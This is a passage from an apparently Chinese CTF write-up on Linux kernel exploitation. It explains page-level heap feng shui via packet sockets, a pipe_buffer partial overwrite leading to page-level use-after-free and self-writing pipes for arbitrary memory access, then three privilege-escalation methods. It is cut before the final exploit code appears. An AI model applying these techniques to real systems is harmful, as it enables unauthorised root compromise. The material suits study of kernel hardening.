src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" alt="image.png"></p><p>接下来让我们重新审视 buddy system ，其基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：</p><p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" alt="page.gif"></p><p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p><ul><li>向 buddy system 请求两份连续的内存页</li><li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li><li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li></ul><p><strong>此时我们便有可能溢出到其他的内核结构体上，从而完成 cross-cache overflow</strong></p><h3 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h3><p>在内核当中有着很多的可以直接向 buddy system 请求页面的 API，这里笔者选用一个来自于 <a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> 的方案：</p><p>当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING ↓</span><br>    packet_set_ring()<br>    alloc_pg_vec()<br></code></pre></td></tr></table></figure><p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2<sup>order</sup> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br><span class="hljs-type">int</span> i;<br><br>pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br><span class="hljs-keyword">goto</span> out_free_pgvec;<br>&#125;<br><br>out:<br><span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>free_pg_vec(pg_vec, order, block_nr);<br>pg_vec = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>相应地， <code>pgv</code> 中的页面也会在 socket 被关闭后释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_release()<br>    packet_set_ring()<br>    free_pg_vec()<br></code></pre></td></tr></table></figure><p> <code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）</p><p>由此，我们可以获得<strong>对一块连续内存的页级掌控</strong>，从而可以这样构造出如下图所示堆布局：</p><ul><li>先释放一部分页面，让 victim object 取得这些页面</li><li>释放一份页面，向题目模块请求分配对象，从而获得该份页面</li><li>再释放一部分页面，让 victim object 取得这些页面</li></ul><p>这样题目所在的页面便会被夹在 victim 对象的页面中间，使得<strong>溢出的稳定性大幅增加</strong></p><p><img src="https://s2.loli.net/2023/05/02/VvPk5nKYmDCWxOs.png" alt="image.png"></p><h2 id="Step-II-fcntl-F-SETPIPE-SZ-更改-pipe-buffer-所在-slub-大小，跨页溢出构造页级-UAF"><a href="#Step-II-fcntl-F-SETPIPE-SZ-更改-pipe-buffer-所在-slub-大小，跨页溢出构造页级-UAF" class="headerlink" title="Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF"></a>Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF</h2><p>接下来我们考虑溢出的目标对象，相信大家最先想到的应该是万能结构体 <code>msg_msg</code> ，但是在笔者看来这个结构体 <em>仍旧不够强大</em> ，而且在过去的各种漏洞利用当中我们未免也太依赖于 <code>msg_msg</code> 了，所以笔者想要探索一些新的方法：）</p><p><img src="https://s2.loli.net/2023/05/01/sJB9zbLgSCYV8KE.png" alt="猪猪侠，你太依赖超级棒棒糖了.png"></p><p>由于仅有一个字节的溢出，毫无疑问的是我们需要寻找一些在结构体头部便有指向其他内核对象的指针的内核对象，我们不难想到的是 <code>pipe_buffer</code> 是一个非常好的的利用对象，其开头有着指向 <code>page</code> 结构体的指针，而 <code>page</code> 的大小仅为 <code>0x40</code> ，可以被 0x100 整除，若我们能够<strong>通过 partial overwrite 使得两个管道指向同一张页面，并释放掉其中一个</strong>，我们便构造出了<strong>页级的 UAF</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p><p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p><p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p><p>同时<strong>管道的特性还能让我们在 UAF 页面上任意读写</strong>，这真是再美妙不过了：）</p><p>但是有一个小问题，<code>pipe_buffer</code> 来自于 <code>kmalloc-cg-1k</code> ，其会请求 order-2 的页面，而题目模块的对象大小为 2k，其会请求 order-3 的页面，如果我们直接进行不同 order 间的堆风水的话，则利用成功率会大打折扣 :（</p><p>但 pipe 可以被挖掘的潜力远比我们想象中大得多：）现在让我们重新审视 <code>pipe_buffer</code> 的分配过程，其实际上是单次分配 <code>pipe_bufs</code> 个 <code>pipe_buffer</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>这里注意到 <code>pipe_buffer</code> <strong>不是一个常量而是一个变量</strong>，那么<strong>我们能否有方法修改 pipe_buffer 的数量？</strong>答案是肯定的，pipe 系统调用非常贴心地为我们提供了 <code>F_SETPIPE_SZ</code> <strong>让我们可以重新分配 pipe_buffer 并指定其数量</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>pipe = get_pipe_info(file, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>ret = pipe_resize_ring(pipe, nr_slots);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br></code></pre></td></tr></table></figure><p>那么我们不难想到的是<strong>我们可以通过 fcntl() 重新分配单个 pipe 的 pipe_buffer 数量，</strong>：</p><ul><li>对于每个 pipe 我们<strong>指定分配 64 个 pipe_buffer，从而使其向 kmalloc-cg-2k 请求对象，而这将最终向 buddy system 请求 order-3 的页面</strong></li></ul><p>由此，我们便成功使得 <code>pipe_buffer</code> 与题目模块的对象<strong>处在同一 order 的内存页上</strong>，从而提高 cross-cache overflow 的成功率</p><p>不过需要注意的是，由于 page 结构体的大小为 0x40，其可以被 0x100 整除，因此若我们所溢出的目标 page 的地址最后一个字节刚好为 <code>\x00</code>，  <em>那就等效于没有溢出</em>  ，因此实际上利用成功率仅为 <code>75% </code> （悲）</p><h2 id="Step-III-构造二级自写管道，实现任意内存读写"><a href="#Step-III-构造二级自写管道，实现任意内存读写" class="headerlink" title="Step.III - 构造二级自写管道，实现任意内存读写"></a>Step.III - 构造二级自写管道，实现任意内存读写</h2><p>有了 page-level UAF，我们接下来考虑向这张页面分配什么结构体作为下一阶段的 victim object</p><p>由于管道本身便提供给我们读写的功能，而我们又能够调整 <code>pipe_buffer</code> 的大小并重新分配结构体，那么再次选择 <code>pipe_buffer</code> 作为 victim object 便是再自然不过的事情：）</p><p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p><p>接下来我们可以通过 UAF 管道<strong>读取 pipe_buffer 内容，从而泄露出 page、pipe_buf_operations 等有用的数据</strong>（可以在重分配前预先向管道中写入一定长度的内容，从而实现数据读取），由于我们可以通过 UAF 管道直接改写 <code>pipe_buffer</code> ，因此将漏洞转化为 dirty pipe 或许会是一个不错的办法（这也是本次比赛中 NU1L 战队的解法）</p><p>但是 pipe 的强大之处远不止这些，由于我们可以对 UAF 页面上的 <code>pipe_buffer</code> 进行读写，我们可以<strong>继续构造出第二级的 page-level UAF</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p><p>为什么要这么做呢？在第一次 UAF 时我们获取到了 page 结构体的地址，而 page 结构体的大小固定为 0x40，<strong>且与物理内存页一一对应</strong>，试想若是我们可以不断地修改一个 pipe 的 page 指针，<strong>则我们便能完成对整个内存空间的任意读写</strong>，因此接下来我们要完成这样的一个利用系统的构造</p><p>再次重新分配 <code>pipe_buffer</code> 结构体到第二级 page-level UAF 页面上，<strong>由于这张物理页面对应的 page 结构体的地址对我们而言是已知的，我们可以直接让这张页面上的 pipe_buffer 的 page 指针指向自身，从而直接完成对自身的修改</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p><p>这里我们可以篡改 <code>pipe_buffer.offset</code> 与 <code>pipe_buffer.len</code> 来移动 pipe 的读写起始位置，从而实现无限循环的读写，但是这两个变量会在完成读写操作后重新被赋值，因此这里我们使用<strong>三个管道</strong>：</p><ul><li>第一个管道用以进行内存空间中的任意读写，我们通过修改其 page 指针完成 ：）</li><li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li><li>第三个管道用以修改第一个与第二个管道，使得第一个管道的 pipe 指针指向指定位置、第二个管道的写入起始位置指向第三个管道</li></ul><p>通过这三个管道之间互相循环修改，我们便<strong>实现了一个可以在内存空间中进行近乎无限制的任意读写系统</strong> ：）</p><h2 id="Step-IV-提权"><a href="#Step-IV-提权" class="headerlink" title="Step.IV - 提权"></a>Step.IV - 提权</h2><p>有了内存空间中的任意读写，提权便是非常简便的一件事情了，这里笔者给出三种提权方法：）</p><h3 id="方法一、修改当前进程的-task-struct-的-cred-为-init-cred"><a href="#方法一、修改当前进程的-task-struct-的-cred-为-init-cred" class="headerlink" title="方法一、修改当前进程的 task_struct 的 cred 为 init_cred"></a>方法一、修改当前进程的 task_struct 的 cred 为 init_cred</h3><p><code>init_cred</code> 为有着 root 权限的 cred，我们可以直接将当前进程的 cred 修改为该 cred 以完成提权，这里iwom可以通过 <code>prctl(PR_SET_NAME, &quot;arttnba3pwnn&quot;);</code> 修改 <code>task_struct.comm</code> ，从而方便搜索当前进程的 <code>task_struct</code> 在内存空间中的位置：）</p><p>不过 <code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的，我们在调试时未必能够获得其地址，因此这里笔者选择通过解析 <code>task_struct</code> 的方式向上一直找到 <code>init</code> 进程（所有进程的父进程）的 <code>task_struct</code> ，从而获得 <code>init_cred</code> 的地址：</p><p><img src="https://s2.loli.net/2023/05/02/jO5GwFnmSxkr3fg.png" alt="image.png"></p><h3 id="方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成-ROP"><a href="#方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成-ROP" class="headerlink" title="方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP"></a>方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP</h3><p><strong>开启了 CFI 并不代表我们便不能够在内核空间中进行任意代码执行了，作为一名黑客没有什么是不可能的，所因此我们仍然要进行任意代码执行：）</strong>（←有点中二的一个人</p><p>由于 page 结构体数组与物理内存页一一对应的缘故，我们可以很轻易地在物理地址与 page 结构体地址间进行转换，而在页表当中存放的是物理地址，我们不难想到的是<strong>我们可以通过解析当前进程的页表来获取到内核栈的物理地址，从而获取到内核栈对应的 page</strong>，之后我们可以<strong>直接向内核栈上写 ROP chain 来完成任意代码执行</strong></p><p>页表的地址可以通过 <code>mm_struct</code> 获取， <code>mm_struct</code> 地址可以通过 <code>task_struct</code> 获取，内核栈地址同样可以通过 <code>task_struct</code> 获取，那么这一切其实是水到渠成的事情：</p><p><img src="https://s2.loli.net/2023/05/02/sRVcEax3wHApBW2.png" alt="image.png"></p><blockquote><p>但这种方法有一个缺陷，我们会<strong>有一定概率没法直接写到当前进程的内核栈上</strong>（也不知道写哪去了），从而导致 ROP 失败，<strong>原因不明</strong></p><blockquote><p>笔者暂时没有发现整个过程的原理存在缺陷的地方，甚至尝试多次重新解析页表（得到的内核栈地址不变）然后写入数据后仍旧无事发生，也不知道究竟是哪出了问题 ：(</p></blockquote></blockquote><h3 id="方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现-USMA"><a href="#方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现-USMA" class="headerlink" title="方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA"></a>方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA</h3><p>既然我们能够进行内存空间中的任意读写，<strong>直接改写内核代码段也是一个实现任意代码执行的好办法</strong>，但是直接映射区对应的内核代码段区域<strong>没有可写入权限，直接写会导致 kernel panic :（</strong></p><p>但是改写内核代码段本质上便是向对应的物理页写入数据，而我们又能够读写进程页表，<strong>我们直接在用户空间建立一个到内核代码段对应物理内存的映射就能改写内核代码段了：）</strong></p><p>方便起见，我们可以先通过 <code>mmap()</code> 随便映射一块内存，之后改写 <code>mmap()</code> 的虚拟地址在页表中对应的物理地址即可，这种方法本质上其实就是 <a href="https://vul.360.net/archives/391">用户态映射攻击</a>：</p><p><img src="https://s2.loli.net/2023/05/02/U3BEbFTsZiy48NQ.png" alt="image.png"></p><h2 id="Final-Exploitation"><a href="#Final-Exploitation" class="headerlink" title="Final Exploitation"></a>Final Exploitation</h2><p>最终的完整 exp 如下，<strong>同时包含笔者所给出的三种提权手段的代码</strong>：</p><blockquote><p>由于 page 结构体地址可能出现末字节为 <code>\x00</code> 的情况，故成功几率仅有 75% （悲）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span 